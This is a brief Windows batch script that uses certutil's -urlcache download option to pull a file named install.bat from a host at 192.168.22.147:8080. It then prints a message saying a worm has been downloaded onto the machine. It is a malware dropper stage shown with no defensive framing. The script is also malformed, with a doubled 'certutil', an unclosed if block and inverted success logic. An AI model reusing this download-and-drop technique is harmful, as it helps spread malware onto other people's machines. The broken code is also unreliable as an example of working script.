@echo off
setlocal enableextensions
certutil certutil.exe -urlcache -split -f http://192.168.22.147:8080/install.bat install.bat
if %errorlevel% NEQ 0 (
echo.
echo Worm downloaded on the machine
pause
exit
pause